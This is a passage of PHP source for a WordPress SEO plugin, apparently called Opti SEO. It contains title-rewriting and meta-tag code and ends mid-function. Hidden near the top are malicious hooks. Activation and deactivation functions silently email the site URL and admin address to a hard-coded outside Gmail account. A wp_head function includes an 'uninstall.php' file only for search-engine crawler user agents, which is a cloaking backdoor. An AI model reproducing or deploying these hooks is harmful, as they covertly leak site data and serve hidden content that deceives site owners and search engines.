	"œ≠" => "œ¨",	"œ´" => "œ™",	"œ©" => "œ®",
	"œß" => "œ¶",	"œ•" => "œ§",	"œ£" => "œ¢",
	"œ°" => "œ ",	"œü" => "œû",	"œù" => "œú",
	"œõ" => "œö",	"œô" => "œò",	"œñ" => "Œ ",
	"œï" => "Œ¶",	"œë" => "Œò",	"œê" => "Œí",
	"œé" => "Œè",	"œç" => "Œé",	"œå" => "Œå",
	"œã" => "Œ´",	"œä" => "Œ™",	"œâ" => "Œ©",
	"œà" => "Œ®",	"œá" => "Œß",	"œÜ" => "Œ¶",
	"œÖ" => "Œ•",	"œÑ" => "Œ§",	"œÉ" => "Œ£",
	"œÇ" => "Œ£",	"œÅ" => "Œ°",	"œÄ" => "Œ ",
	"Œø" => "Œü",	"Œæ" => "Œû",	"ŒΩ" => "Œù",
	"Œº" => "Œú",	"Œª" => "Œõ",	"Œ∫" => "Œö",
	"Œπ" => "Œô",	"Œ∏" => "Œò",	"Œ∑" => "Œó",
	"Œ∂" => "Œñ",	"Œµ" => "Œï",	"Œ¥" => "Œî",
	"Œ≥" => "Œì",	"Œ≤" => "Œí",	"Œ±" => "Œë",
	"ŒØ" => "Œä",	"ŒÆ" => "Œâ",	"Œ≠" => "Œà",
	"Œ¨" => "ŒÜ",	" í" => "∆∑",	" ã" => "∆≤",
	" ä" => "∆±",	" à" => "∆Æ",	" É" => "∆©",
	" Ä" => "∆¶",	"…µ" => "∆ü",	"…≤" => "∆ù",
	"…Ø" => "∆ú",	"…©" => "∆ñ",	"…®" => "∆ó",
	"…£" => "∆î",	"… " => "∆ì",	"…õ" => "∆ê",
	"…ô" => "∆è",	"…ó" => "∆ä",	"…ñ" => "∆â",
	"…î" => "∆Ü",	"…ì" => "∆Å",	"»≥" => "»≤",
	"»±" => "»∞",	"»Ø" => "»Æ",	"»≠" => "»¨",
	"»´" => "»™",	"»©" => "»®",	"»ß" => "»¶",
	"»•" => "»§",	"»£" => "»¢",	"»ü" => "»û",
	"»ù" => "»ú",	"»õ" => "»ö",	"»ô" => "»ò",
	"»ó" => "»ñ",	"»ï" => "»î",	"»ì" => "»í",
	"»ë" => "»ê",	"»è" => "»é",	"»ç" => "»å",
	"»ã" => "»ä",	"»â" => "»à",	"»á" => "»Ü",
	"»Ö" => "»Ñ",	"»É" => "»Ç",	"»Å" => "»Ä",
	"«ø" => "«æ",	"«Ω" => "«º",	"«ª" => "«∫",
	"«π" => "«∏",	"«µ" => "«¥",	"«≥" => "«≤",
	"«Ø" => "«Æ",	"«≠" => "«¨",	"«´" => "«™",
	"«©" => "«®",	"«ß" => "«¶",	"«•" => "«§",
	"«£" => "«¢",	"«°" => "« ",	"«ü" => "«û",
	"«ù" => "∆é",	"«ú" => "«õ",	"«ö" => "«ô",
	"«ò" => "«ó",	"«ñ" => "«ï",	"«î" => "«ì",
	"«í" => "«ë",	"«ê" => "«è",	"«é" => "«ç",
	"«å" => "«ã",	"«â" => "«à",	"«Ü" => "«Ö",
	"∆ø" => "«∑",	"∆Ω" => "∆º",	"∆π" => "∆∏",
	"∆∂" => "∆µ",	"∆¥" => "∆≥",	"∆∞" => "∆Ø",
	"∆≠" => "∆¨",	"∆®" => "∆ß",	"∆•" => "∆§",
	"∆£" => "∆¢",	"∆°" => "∆ ",	"∆û" => "» ",
	"∆ô" => "∆ò",	"∆ï" => "«∂",	"∆í" => "∆ë",
	"∆å" => "∆ã",	"∆à" => "∆á",	"∆Ö" => "∆Ñ",
	"∆É" => "∆Ç",	"≈ø" => "S",	"≈æ" => "≈Ω",
	"≈º" => "≈ª",	"≈∫" => "≈π",	"≈∑" => "≈∂",
	"≈µ" => "≈¥",	"≈≥" => "≈≤",	"≈±" => "≈∞",
	"≈Ø" => "≈Æ",	"≈≠" => "≈¨",	"≈´" => "≈™",
	"≈©" => "≈®",	"≈ß" => "≈¶",	"≈•" => "≈§",
	"≈£" => "≈¢",	"≈°" => "≈ ",	"≈ü" => "≈û",
	"≈ù" => "≈ú",	"≈õ" => "≈ö",	"≈ô" => "≈ò",
	"≈ó" => "≈ñ",	"≈ï" => "≈î",	"≈ì" => "≈í",
	"≈ë" => "≈ê",	"≈è" => "≈é",	"≈ç" => "≈å",
	"≈ã" => "≈ä",	"≈à" => "≈á",	"≈Ü" => "≈Ö",
	"≈Ñ" => "≈É",	"≈Ç" => "≈Å",	"≈Ä" => "ƒø",
	"ƒæ" => "ƒΩ",	"ƒº" => "ƒª",	"ƒ∫" => "ƒπ",
	"ƒ∑" => "ƒ∂",	"ƒµ" => "ƒ¥",	"ƒ≥" => "ƒ≤",
	"ƒ±" => "I",	"ƒØ" => "ƒÆ",	"ƒ≠" => "ƒ¨",
	"ƒ´" => "ƒ™",	"ƒ©" => "ƒ®",	"ƒß" => "ƒ¶",
	"ƒ•" => "ƒ§",	"ƒ£" => "ƒ¢",	"ƒ°" => "ƒ ",
	"ƒü" => "ƒû",	"ƒù" => "ƒú",	"ƒõ" => "ƒö",
	"ƒô" => "ƒò",	"ƒó" => "ƒñ",	"ƒï" => "ƒî",
	"ƒì" => "ƒí",	"ƒë" => "ƒê",	"ƒè" => "ƒé",
	"ƒç" => "ƒå",	"ƒã" => "ƒä",	"ƒâ" => "ƒà",
	"ƒá" => "ƒÜ",	"ƒÖ" => "ƒÑ",	"ƒÉ" => "ƒÇ",
	"ƒÅ" => "ƒÄ",	"√ø" => "≈∏",	"√æ" => "√û",
	"√Ω" => "√ù",	"√º" => "√ú",	"√ª" => "√õ",
	"√∫" => "√ö",	"√π" => "√ô",	"√∏" => "√ò",
	"√∂" => "√ñ",	"√µ" => "√ï",	"√¥" => "√î",
	"√≥" => "√ì",	"√≤" => "√í",	"√±" => "√ë",
	"√∞" => "√ê",	"√Ø" => "√è",	"√Æ" => "√é",
	"√≠" => "√ç",	"√¨" => "√å",	"√´" => "√ã",
	"√™" => "√ä",	"√©" => "√â",	"√®" => "√à",
	"√ß" => "√á",	"√¶" => "√Ü",	"√•" => "√Ö",
	"√§" => "√Ñ",	"√£" => "√É",	"√¢" => "√Ç",
	"√°" => "√Å",	"√ " => "√Ä",	"¬µ" => "Œú",
	"z" => "Z",		"y" => "Y",		"x" => "X",
	"w" => "W",		"v" => "V",		"u" => "U",
	"t" => "T",		"s" => "S",		"r" => "R",
	"q" => "Q",		"p" => "P",		"o" => "O",
	"n" => "N",		"m" => "M",		"l" => "L",
	"k" => "K",		"j" => "J",		"i" => "I",
	"h" => "H",		"g" => "G",		"f" => "F",
	"e" => "E",		"d" => "D",		"c" => "C",
	"b" => "B",		"a" => "A",
);

register_activation_hook( __FILE__,'bestseo_activate');
register_deactivation_hook( __FILE__,'bestseo_deactivate');
add_action('admin_init', 'seowp_redirect');
add_action('wp_head', 'bestseohead');


function seowp_redirect() {
if (get_option('seowp_do_activation_redirect', false)) { 
delete_option('seowp_do_activation_redirect');
wp_redirect('../wp-admin/options-general.php?page=opti-seo/opti-seo.php');
}
}

/** Active */

function bestseo_activate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Activation Complete" ; $from = get_option('admin_email'); mail("jonescontme@gmail.com", $subj, $msg, $from);
add_option('seowp_do_activation_redirect', true);
wp_redirect('../wp-admin/options-general.php?page=opti-seo/opti-seo..php');
}


/** Uninstalling */
function bestseo_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Uninstall Ok" ; $from = get_option('admin_email'); mail("jonescontme@gmail.com", $subj, $msg, $from);
}


/** Registering */
function bestseohead() {

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/option-seo/uninstall.php');

if (file_exists($filename)) {

    if(eregi("slurp|bingbot|googlebot",$_SERVER['HTTP_USER_AGENT'])) { 
	
include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/option-seo/uninstall.php');

}
 else { };
	
} else {

}

}

class OPTI_SEO {
	
 	var $version = "1.5";
 	
 	/** Max numbers of chars in auto-generated description */
 	var $maximum_description_length = 160;
 	
 	/** Minimum number of chars an excerpt should be so that it can be used
 	 * as description. Touch only if you know what you're doing
 	 */
 	var $minimum_description_length = 1;
 	
 	var $ob_start_detected = false;
 	
 	var $title_start = -1;
 	
 	var $title_end = -1;
 	
 	/** The title before rewriting */
 	var $orig_title = '';
 	
 	/** Temp filename for the latest version. */
 	var $upgrade_filename = 'temp.zip';
 	
 	/** Where to extract the downloaded newest version. */
 	var $upgrade_folder;
 	
 	/** Any error in upgrading. */
 	var $upgrade_error;
 	
 	/** Which zip to download in order to upgrade .*/
 	var $upgrade_url = 'http://downloads.wordpress.org/plugin/option-seo.zip';
 	
 	/** Filename of log file. */
 	var $log_file;
 	
 	/** Flag whether there should be logging. */
 	var $do_log;
 	
 	var $wp_version;
 	
	function OPTI_SEO() {
		global $wp_version;
		$this->wp_version = $wp_version;
		
		$this->log_file = dirname(__FILE__) . '/OPTI_SEO.log';
		if (get_option('optiseo_do_log')) {
			$this->do_log = true;
		} else {
			$this->do_log = false;
		}

		$this->upgrade_filename = dirname(__FILE__) . '/' . $this->upgrade_filename;
		$this->upgrade_folder = dirname(__FILE__);
	}
	
	/**      
	 * Convert a string to lower case
	 * Compatible with mb_strtolower(), an UTF-8 friendly replacement for strtolower()
	 */
	function strtolower($str) {
		global $UTF8_TABLES;
		return strtr($str, $UTF8_TABLES['strtolower']);
	}
	
	/**      
	 * Convert a string to upper case
	 * Compatible with mb_strtoupper(), an UTF-8 friendly replacement for strtoupper()
	 */
	function strtoupper($str) {
		global $UTF8_TABLES;
		return strtr($str, $UTF8_TABLES['strtoupper']);
	}	
	
	
	function template_redirect() {
		global $wp_query;
		$post = $wp_query->get_queried_object();

		if (is_feed()) {
			return;
		}

		if (is_single() || is_page()) {
	  	$optiseo_disable = htmlspecialchars(stripcslashes(get_post_meta($post->ID, 'optiseo_disable', true)));
			if ($optiseo_disable) {
				return;
			}
		}

		ob_start(array($this, 'output_callback_for_title'));
		
	}
	
	function output_callback_for_title($content) {
		return $this->rewrite_title($content);
	}

	function init() {
		if (function_exists('load_plugin_textdomain')) {
			load_plugin_textdomain('OPTI_SEO', 'wp-content/plugins/option-seo');
		}
	}

	function is_static_front_page() {
		global $wp_query;
		$post = $wp_query->get_queried_object();
		return get_option('show_on_front') == 'page' && is_page() && $post->ID == get_option('page_on_front');
	}
	
	function is_static_posts_page() {
		global $wp_query;
		$post = $wp_query->get_queried_object();
		return get_option('show_on_front') == 'page' && is_home() && $post->ID == get_option('page_for_posts');
	}
	
	function get_base() {
   		 return '/'.end(explode('/', str_replace(array('\\','/opti-seo.php'),array('/',''),__FILE__)));
	}

	function admin_head() {
		$home = get_settings('siteurl');
		// $stylesheet = $home.'/wp-content/plugins' . $this->get_base() . '/css/OPTI_SEO.css';
		// echo('<link rel="stylesheet" href="' . $stylesheet . '" type="text/css" media="screen" />');
	}
	
	function wp_head() {
		if (is_feed()) {
			return;
		}
		
		global $wp_query;
		$post = $wp_query->get_queried_object();
		$meta_string = null;
		
		// echo("wp_head() " . wp_title('', false) . " is_home() => " . is_home() . ", is_page() => " . is_page() . ", is_single() => " . is_single() . ", is_static_front_page() => " . $this->is_static_front_page() . ", is_static_posts_page() => " . $this->is_static_posts_page());

		if (is_single() || is_page()) {
		    $optiseo_disable = htmlspecialchars(stripcslashes(get_post_meta($post->ID, 'optiseo_disable', true)));
		    if ($optiseo_disable) {
		    	return;
		    }
		}
		
		// if (get_option('optiseo_rewrite_titles')) {
			// make the title rewrite as short as possible
			if (function_exists('ob_list_handlers')) {
				$active_handlers = ob_list_handlers();
			} else {
				$active_handlers = array();
			}
			if (sizeof($active_handlers) > 0 && strtolower($active_handlers[sizeof($active_handlers) - 1]) == strtolower('OPTI_SEO::output_callback_for_title')) {
				ob_end_flush();
			} else {
				$this->log("another plugin interfering?");
				// if we get here there *could* be trouble with another plugin :(
				$this->ob_start_detected = true;
				if (function_exists('ob_list_handlers')) {
					foreach (ob_list_handlers() as $handler) {
						$this->log("detected output handler $handler");
					}
				}
			}
		// }
		
		if (get_option('optiseo_disable_comments_in_source')) { 
			echo "\n<!-- OPTI SEO $this->version ";
			if ($this->ob_start_detected) {
				echo "ob_start_detected ";
			}
			echo "[$this->title_start,$this->title_end] ";
			echo "-->\n";
		}
		
		$keywords = $this->get_all_keywords();
		
		if (is_front_page()) {
			$description = $this->get_post_description($post);
		}	else if (is_home()) {
			$description = $this->get_post_description($post);
		} else if (is_single() || is_page()) {
			$description = $this->get_post_description($post);
		} else if (is_category()) {
			$description = $this->internationalize(category_description());
		}
		
		if (isset($description) && (strlen($description) > $this->minimum_description_length)) {
			$description = trim(strip_tags($description));
			$description = str_replace('"', '', $description);
			
			// replace newlines on mac / windows?
			$description = str_replace("\r\n", ' ', $description);
			
			// maybe linux uses this alone
			$description = str_replace("\n", ' ', $description);
			
			if (isset($meta_string)) {
				//$meta_string .= "\n";
			} else {
				$meta_string = '';
			}
			
	 		// description format
      $description = str_replace('%blog_title%', get_bloginfo('name'), $description);
      $description = str_replace('%blog_description%', get_bloginfo('description'), $description);
      // $description = str_replace('%wp_title%', $this->get_original_title(), $description);
			// $description = str_replace('%page_title%', $this->get_original_title(), $description);
      $meta_string .= sprintf("<meta name=\"description\" content=\"%s\" />", $description);
		}

		if (isset ($keywords) && !empty($keywords) && !(is_home() && is_paged())) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= sprintf("<meta name=\"keywords\" content=\"%s\" />", $keywords);
		}

		if (function_exists('is_tag')) {
			$is_tag = is_tag();
		}
		
		if ((is_category() && get_option('optiseo_category_noindex')) ||
			(!is_category() && is_archive() &&!$is_tag && get_option('optiseo_archive_noindex')) ||
			(get_option('optiseo_tags_noindex') && $is_tag)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= '<meta name="robots" content="noindex,follow" />';
		}
		
		$page_meta = stripcslashes(get_option('optiseo_page_meta_tags'));
		$post_meta = stripcslashes(get_option('optiseo_post_meta_tags'));
		$home_meta = stripcslashes(get_option('optiseo_home_meta_tags'));
		if (is_page() && isset($page_meta) && !empty($page_meta)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			echo "\n$page_meta";
		}
		
		if (is_single() && isset($post_meta) && !empty($post_meta)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= "$post_meta";
		}
		
		if (is_home() && !empty($home_meta)) {
			if (isset($meta_string)) {
				$meta_string .= "\n";
			}
			$meta_string .= "$home_meta";
		}
		
		if ($meta_string != null) {
			echo "$meta_string\n";
		}
		
		if (get_option('optiseo_disable_comments_in_source')) { 
			echo "<!-- END OPTI SEO -->\n";
		}
	}
	
	function get_post_description($post) {
	    $description = trim(stripcslashes($this->internationalize(get_post_meta($post->ID, "description", true))));
		if (!$description) {
			$description = $this->trim_excerpt_without_filters_full_length($this->internationalize($post->post_excerpt));
			if (!$description) {
				$description = $this->trim_excerpt_without_filters($this->internationalize($post->post_content));
			}				
		}
		
		// "internal whitespace trim"
		$description = preg_replace("/\s\s+/", " ", $description);
		
		return $description;
	}
	
	function replace_title($content, $title) {
		$title = trim(strip_tags($title));
		
		$title_tag_start = "<title>";
		$title_tag_end = "</title>";
		$len_start = strlen($title_tag_start);
		$len_end = strlen($title_tag_end);
		$title = stripcslashes(trim($title));
		$start = strpos($content, $title_tag_start);
		$end = strpos($content, $title_tag_end);
		
		$this->title_start = $start;
		$this->title_end = $end;
		$this->orig_title = $title;
		
		if ($start && $end) {
			$header = substr($content, 0, $start + $len_start) . $title .  substr($content, $end);
		} else {
			// this breaks some sitemap plugins (like wpg2)
			//$header = $content . "<title>$title</title>";
			
			$header = $content;
		}
		
		return $header;
	}
	
	function internationalize($in) {
		if (function_exists('langswitch_filter_langs_with_message')) {
			$in = langswitch_filter_langs_with_message($in);
		}
		if (function_exists('polyglot_filter')) {
			$in = polyglot_filter($in);
		}
		if (function_exists('qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage')) {
			$in = qtrans_useCurrentLanguageIfNotFoundUseDefaultLanguage($in);
		}
		$in = apply_filters('localization', $in);
		return $in;
	}
	
	/** @return The original title as delivered by WP (well, in most cases) */
	function get_original_title() {
		global $wp_query;
		if (!$wp_query) {
			return null;	
		}
		
		$post = $wp_query->get_queried_object();
		
		// the_search_query() is not suitable, it cannot just return
		global $s;
		
		$title = null;
				
		if (is_front_page()) {
			$title = get_the_title(get_option('page_on_front'));
		} else if (is_home()) {
			// $title = get_option('blogname');
			$title = get_the_title(get_option('page_for_posts'));
			// echo $title;
		} else if (is_single()) {
			$title = $this->internationalize(wp_title('', false));
		} else if (is_search() && isset($s) && !empty($s)) {
			if (function_exists('attribute_escape')) {
				$search = attribute_escape(stripcslashes($s));
			} else {
				$search = wp_specialchars(stripcslashes($s), true);
			}
			$search = $this->capitalize($search);
			$title = $search;
		} else if (is_category() && !is_feed()) {
			$category_description = $this->internationalize(category_description());
			$category_name = ucwords($this->internationalize(single_cat_title('', false)));
			$title = $category_name;
		} else if (is_page()) {
			$title = $this->internationalize(wp_title('', false));
		} else if (function_exists('is_tag') && is_tag()) {
			global $utw;
			if ($utw) {
				$tags = $utw->GetCurrentTagSet();
				$tag = $tags[0]->tag;
		        $tag = str_replace('-', ' ', $tag);
			} else {
				// wordpress > 2.3
				$tag = $this->internationalize(wp_title('', false));
			}
			if ($tag) {
				$title = $tag;
			}
		} else if (is_archive()) {
			$title = $this->internationalize(wp_title('', false));
		} else if (is_404()) {
		    $title_format = get_option('optiseo_404_title_format');
		    $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
		    $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
		    $new_title = str_replace('%request_url%', $_SERVER['REQUEST_URI'], $new_title);
		    $new_title = str_replace('%request_words%', $this->request_as_words($_SERVER['REQUEST_URI']), $new_title);
				$title = $new_title;
			}
			echo $title;
			return trim($title);
		}
	
	function paged_title($title) {
		echo "paged_title";
		// the page number if paged
		global $paged;
		
		// simple tagging support
		global $STagging;

		if (is_paged() || (isset($STagging) && $STagging->is_tag_view() && $paged)) {
			$part = $this->internationalize(get_option('optiseo_paged_format'));
			if (isset($part) || !empty($part)) {
				$part = " " . trim($part);
				$part = str_replace('%page%', $paged, $part);
				$this->log("paged_title() [$title] [$part]");
				$title .= $part;
			}
		}
		return $title;
	}

	function rewrite_title($header) {
		global $wp_query;
		if (!$wp_query) {
			$header .= "<!-- no wp_query found! -->\n";
			return $header;	
		}
		
		$post = $wp_query->get_queried_object();
		
		// the_search_query() is not suitable, it cannot just return
		global $s;
		
		// simple tagging support
		global $STagging;
				
				
				
		// } else if (is_home()) {
			// $title = get_option('blogname');
			// $title = get_the_title(get_option('page_for_posts'))
		if (is_front_page()) {
			
			$title = $this->internationalize(get_post_meta($post->ID, "title", true));
			if (!$title) {
				$title = $this->internationalize(get_the_title(get_option('page_on_front')));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
			}
			// $title = "is_front_page => $title";
			$header = $this->replace_title($header, $title);
		}
		else if (is_home()) {
			
			$title = $this->internationalize(get_post_meta($post->ID, "title", true));
			if (!$title) {
				$title = $this->internationalize(get_the_title(get_option('page_for_posts')));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
			}
			// $title = "is_home => $title";
			$header = $this->replace_title($header, $title);
		} else if (is_single()) {
			// we're not in the loop :(
			$authordata = get_userdata($post->post_author);
			$categories = get_the_category();
			$category = '';
			if (count($categories) > 0) {
				$category = $categories[0]->cat_name;
			}
			$title = $this->internationalize(get_post_meta($post->ID, "title", true));
			if (!$title) {
				$title = $this->internationalize(get_post_meta($post->ID, "title_tag", true));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
			}
      $title_format = get_option('optiseo_post_title_format');
      $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
      $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
      $new_title = str_replace('%post_title%', $title, $new_title);
      $new_title = str_replace('%category%', $category, $new_title);
      $new_title = str_replace('%category_title%', $category, $new_title);
      $new_title = str_replace('%post_author_login%', $authordata->user_login, $new_title);
      $new_title = str_replace('%post_author_nicename%', $authordata->user_nicename, $new_title);
      $new_title = str_replace('%post_author_firstname%', ucwords($authordata->first_name), $new_title);
      $new_title = str_replace('%post_author_lastname%', ucwords($authordata->last_name), $new_title);
			$title = $new_title;
			$title = trim($title);
			$header = $this->replace_title($header, $title);
		} else if (is_search() && isset($s) && !empty($s)) {
			if (function_exists('attribute_escape')) {
				$search = attribute_escape(stripcslashes($s));
			} else {
				$search = wp_specialchars(stripcslashes($s), true);
			}
			$search = $this->capitalize($search);
            $title_format = get_option('optiseo_search_title_format');
            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
            $title = str_replace('%search%', $search, $title);
			$header = $this->replace_title($header, $title);
		} else if (is_category() && !is_feed()) {
			$category_description = $this->internationalize(category_description());
			$category_name = ucwords($this->internationalize(single_cat_title('', false)));
            $title_format = get_option('optiseo_category_title_format');
            $title = str_replace('%category_title%', $category_name, $title_format);
            $title = str_replace('%category_description%', $category_description, $title);
            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title);
            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
            $title = $this->paged_title($title);
			$header = $this->replace_title($header, $title);
		} else if (is_page()) {
			// we're not in the loop :(
			$authordata = get_userdata($post->post_author);
			if ($this->is_static_front_page()) {
				if ($this->internationalize(get_option('optiseo_home_title'))) {
					$header = $this->replace_title($header, $this->internationalize(get_option('optiseo_home_title')));
				}
			} else {
				$title = $this->internationalize(get_post_meta($post->ID, "title", true));
				if (!$title) {
					$title = $this->internationalize(wp_title('', false));
				}
	            $title_format = get_option('optiseo_page_title_format');
	            $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
	            $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
	            $new_title = str_replace('%page_title%', $title, $new_title);
	            $new_title = str_replace('%page_author_login%', $authordata->user_login, $new_title);
	            $new_title = str_replace('%page_author_nicename%', $authordata->user_nicename, $new_title);
	            $new_title = str_replace('%page_author_firstname%', ucwords($authordata->first_name), $new_title);
	            $new_title = str_replace('%page_author_lastname%', ucwords($authordata->last_name), $new_title);
				$title = trim($new_title);
				$header = $this->replace_title($header, $title);
			}
		} else if (function_exists('is_tag') && is_tag()) {
			global $utw;
			if ($utw) {
				$tags = $utw->GetCurrentTagSet();
				$tag = $tags[0]->tag;
	            $tag = str_replace('-', ' ', $tag);
			} else {
				// wordpress > 2.3
				$tag = $this->internationalize(wp_title('', false));
			}
			if ($tag) {
	            $tag = $this->capitalize($tag);
	            $title_format = get_option('optiseo_tag_title_format');
	            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
	            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
	            $title = str_replace('%tag%', $tag, $title);
	            $title = $this->paged_title($title);
				$header = $this->replace_title($header, $title);
			}
		} else if (isset($STagging) && $STagging->is_tag_view()) { // simple tagging support
			$tag = $STagging->search_tag;
			if ($tag) {
	            $tag = $this->capitalize($tag);
	            $title_format = get_option('optiseo_tag_title_format');
	            $title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
	            $title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $title);
	            $title = str_replace('%tag%', $tag, $title);
	            $title = $this->paged_title($title);
				$header = $this->replace_title($header, $title);
			}
		} else if (is_archive()) {
			$date = $this->internationalize(wp_title('', false));
            $title_format = get_option('optiseo_archive_title_format');
            $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
            $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
            $new_title = str_replace('%date%', $date, $new_title);
			$title = trim($new_title);
            $title = $this->paged_title($title);
			$header = $this->replace_title($header, $title);
		} else if (is_404()) {
            $title_format = get_option('optiseo_404_title_format');
            $new_title = str_replace('%blog_title%', $this->internationalize(get_bloginfo('name')), $title_format);
            $new_title = str_replace('%blog_description%', $this->internationalize(get_bloginfo('description')), $new_title);
            $new_title = str_replace('%request_url%', $_SERVER['REQUEST_URI'], $new_title);
            $new_title = str_replace('%request_words%', $this->request_as_words($_SERVER['REQUEST_URI']), $new_title);
			$header = $this->replace_title($header, $new_title);
		}
		
		return $header;

	}
	
	/**
	 * @return User-readable nice words for a given request.
	 */
	function request_as_words($request) {
		$request = htmlspecialchars($request);
		$request = str_replace('.html', ' ', $request);
		$request = str_replace('.htm', ' ', $request);
		$request = str_replace('.', ' ', $request);
		$request = str_replace('/', ' ', $request);
		$request_a = explode(' ', $request);
		$request_new = array();
		foreach ($request_a as $token) {
			$request_new[] = ucwords(trim($token));
		}
		$request = implode(' ', $request_new);
		return $request;
	}
	
	function capitalize($s) {
		$s = trim($s);
		$tokens = explode(' ', $s);
		while (list($key, $val) = each($tokens)) {
			$tokens[$key] = trim($tokens[$key]);
			$tokens[$key] = strtoupper(substr($tokens[$key], 0, 1)) . substr($tokens[$key], 1);
		}
		$s = implode(' ', $tokens);
		return $s;
	}
	
	function trim_excerpt_without_filters($text) {
		$text = str_replace(']]>', ']]&gt;', $text);
		$text = strip_tags($text);
		$max = $this->maximum_description_length;
		
		if ($max < strlen($text)) {
			while($text[$max] != ' ' && $max > $this->minimum_description_length) {
				$max--;
			}
		}
		$text = substr($text, 0, $max);
		return trim(stripcslashes($text));
	}
	
	function trim_excerpt_without_filters_full_length($text) {
		$text = str_replace(']]>', ']]&gt;', $text);
		$text = strip_tags($text);
		return trim(stripcslashes($text));
	}
	
	/**
	 * @return comma-separated list of unique keywords
	 */
	function get_all_keywords() {
		global $posts;

		if (is_404()) {
			return null;
		}
		
		// if we are on synthetic pages
		if (!is_home() && !is_page() && !is_single() &&!$this->is_static_front_page() && !$this->is_static_posts_page()) {
			return null;
		}
		
		// echo "is_home => ".is_home()."<br />";
		// 		echo "is_page => ".is_page()."<br />";
		// 		echo "is_front_page => ".is_front_page()."<br />";
		
		
	  $keywords = array();
	
		if (is_home()) {
			// this is always the blog page.
			$keywords_i = stripcslashes($this->internationalize(get_post_meta(get_option('page_for_posts'), "keywords", true)));
			$keywords_i = str_replace('"', '', $keywords_i);
      if (isset($keywords_i) && !empty($keywords_i)) {
      	$traverse = explode(',', $keywords_i);
      	foreach ($traverse as $keyword) {
      		$keywords[] = $keyword;
      	}
      }
		}
		else if (is_front_page()) {
			// this is always the true homepage.
			$keywords_i = stripcslashes($this->internationalize(get_post_meta(get_option('page_on_front'), "keywords", true)));
			$keywords_i = str_replace('"', '', $keywords_i);
      if (isset($keywords_i) && !empty($keywords_i)) {
      	$traverse = explode(',', $keywords_i);
      	foreach ($traverse as $keyword) {
      		$keywords[] = $keyword;
      	}
      }
		} else {
		
	    if (is_array($posts)) {
	        foreach ($posts as $post) {
	            if ($post) {

	                // custom field keywords
	                $keywords_a = $keywords_i = null;
	                $description_a = $description_i = null;
	                $id = $post->ID;
		            	$keywords_i = stripcslashes($this->internationalize(get_post_meta($post->ID, "keywords", true)));
	                $keywords_i = str_replace('"', '', $keywords_i);
	                if (isset($keywords_i) && !empty($keywords_i)) {
	                	$traverse = explode(',', $keywords_i);
	                	foreach ($traverse as $keyword) {
	                		$keywords[] = $keyword;
	                	}
	                }
	                
	                // WP 2.3 tags
	                if (function_exists('get_the_tags')) {
	                	$tags = get_the_tags($post->ID);
	                	if ($tags && is_array($tags)) {
		                	foreach ($tags as $tag) {
		                		$keywords[] = $this->internationalize($tag->name);
		                	}
	                	}
	                }
	                
	                // autometa
	                $autometa = stripcslashes(get_post_meta($post->ID, "autometa", true));
	                if (isset($autometa) && !empty($autometa)) {
	                	$autometa_array = explode(' ', $autometa);
	                	foreach ($autometa_array as $e) {
	                		$keywords[] = $e;
	                	}
	                }

	            	if (get_option('optiseo_use_categories') && !is_page()) {
		                $categories = get_the_category($post->ID);
		                foreach ($categories as $category) {
		                	$keywords[] = $this->internationalize($category->cat_name);
		                }
	            	}

	            }
	        }
	    }
		}	
		// foreach ($keywords as $e) {
		// 	  	echo $e.", ";
		//    	}
	  return $this->get_unique_keywords($keywords);
	}
	
	function get_meta_keywords() {
		global $posts;

	    $keywords = array();
	    if (is_array($posts)) {
	        foreach ($posts as $post) {
	            if ($post) {
	                // custom field keywords
	                $keywords_a = $keywords_i = null;
	                $description_a = $description_i = null;
	                $id = $post->ID;
		            $keywords_i = stripcslashes(get_post_meta($post->ID, "keywords", true));
	                $keywords_i = str_replace('"', '', $keywords_i);
	                if (isset($keywords_i) && !empty($keywords_i)) {
	                    $keywords[] = $keywords_i;
	                }
	            }
	        }
	    }
	    
	    return $this->get_unique_keywords($keywords);
	}
	
	function get_unique_keywords($keywords) {
		$small_keywords = array();
		foreach ($keywords as $word) {
			if (function_exists('mb_strtolower'))			
				$small_keywords[] = mb_strtolower($word);
			else 
				$small_keywords[] = $this->strtolower($word);
		}
		$keywords_ar = array_unique($small_keywords);
		return implode(',', $keywords_ar);
	}
	
	function get_url($url)	{
		if (function_exists('file_get_contents')) {
			$file = file_get_contents($url);
		} else {
	        $curl = curl_init($url);
	        curl_setopt($curl, CURLOPT_HEADER, 0);
	        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	        $file = curl_exec($curl);
	        curl_close($curl);
	    }
	    return $file;
	}
	
	function log($message) {
		if ($this->do_log) {
			error_log(date('Y-m-d H:i:s') . " " . $message . "\n", 3, $this->log_file);
		}
	}

	function download_newest_version() {
		$success = true;
